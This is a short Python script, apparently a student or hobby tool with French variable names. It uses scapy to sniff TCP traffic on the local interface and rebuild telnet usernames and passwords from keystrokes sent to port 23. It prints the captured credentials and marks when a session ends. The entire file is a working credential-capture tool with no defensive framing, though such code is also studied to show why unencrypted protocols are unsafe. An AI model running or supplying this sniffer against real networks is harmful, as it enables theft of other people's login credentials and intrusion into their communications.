from scapy.all import *

login = 0
mdp = ""
user = ""


def telnet(trame):
    a = []
    global login, mdp, user
    commande = ["cat", "ls", "exit"]
    texte = ""
    try:
        if trame[1].dport == 23 or trame[1].sport == 23:
            try:
                data = trame[Raw].load
                if "login" in str(data):
                    login = 1
                if login == 1 and trame[1].dport == 23:
                    if len(data) == 1:
                        data = data.decode("UTF-8").split()
                        user += str(data[0])
                    else:
                        login = 0
                if "Password" in str(data):
                    login = 2
                    a.append(user)
                    print(user)
                if login == 2 and trame[1].dport == 23:
                    if len(data) == 1:
                        data = data.decode("UTF-8").split()
                        mdp += str(data[0])
                        print(mdp)
                    else:
                        login = 0
                if "Last login" in str(data):
                    a.append(mdp)
                    print(data, a)
                if len(data) == 1 and login == 0 and trame[1].dport == 23:
                    data = data.decode("UTF-8").split()
                    texte += str(data[0])
                if texte[-4:] == "exit" and trame[1].dport == 23:
                    print("fin de connexion telnet au serveur", trame[0].dst)
            except IndexError:
                pass
    except IndexError:
        pass
    return


carte = conf.iface
sniff(filter="tcp", prn=telnet, iface=carte)
